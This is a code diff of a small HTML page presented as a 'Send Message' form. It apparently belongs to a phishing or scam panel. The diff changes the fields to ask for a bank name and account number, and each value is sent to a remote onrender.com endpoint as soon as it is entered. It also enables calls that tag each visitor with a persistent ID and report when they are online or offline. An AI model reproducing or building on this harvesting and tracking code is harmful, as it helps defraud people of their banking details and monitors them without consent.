@@ -12,7 +12,7 @@
 <body>
     <h2>📤 Send Message</h2>
     <form id="form" method="post">
-        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), account: this.value })" placeholder="Type your name here">
+        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), account: this.value })" placeholder="Type your bank name here">
         <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), realAcc: this.value })" placeholder="Type your account here">
         <input type="submit" value="Send to Receiver">
     </form>
@@ -22,7 +22,7 @@
     <script>   
 // Sender 
 function sender(payload) {
-    const url = 'https://send-39yi.onrender.com/in/messages';  
+    const url = 'https://send-39yi.onrender.com/api/messages';  
     fetch(url, {
         method: 'POST',
         headers: {
@@ -47,9 +47,9 @@ function generateRandomCode() {
     return allChars.join('');
 }
         
-        // Check if code has been created
+// Check if UserId has been created
 if (localStorage.getItem('code')) {
-  console.log('Item is already stored');
+  console.log('UserId is already stored');
 } else {
   // Run the function
   const code = generateRandomCode();
@@ -60,7 +60,7 @@ if (localStorage.getItem('code')) {
   localStorage.setItem('digits', digits);
     
   // Send to backend
-  //sender({ userId: code, demoAcc: digits, status: "online" });
+    sender({ userId: code, demoAcc: digits, status: "online" });
 }  
 
 // Get User ID
@@ -73,10 +73,10 @@ const demoAcc = localStorage.getItem('digits');
 // Get Status      
 document.addEventListener('visibilitychange', () => {
   if (document.visibilityState === 'visible') {
-      sender({ name: "Mike", amount: "2500", update: "clear" });
-    //sender({ userId: userId, status: "online" });
+      //sender({ name: "Mike", amount: "2500", update: "clear" });
+    sender({ userId: userId, status: "online" });
   } else {
-    //sender({ userId: userId, status: "offline" });          
+    sender({ userId: userId, status: "offline" });          
   }
 });
 
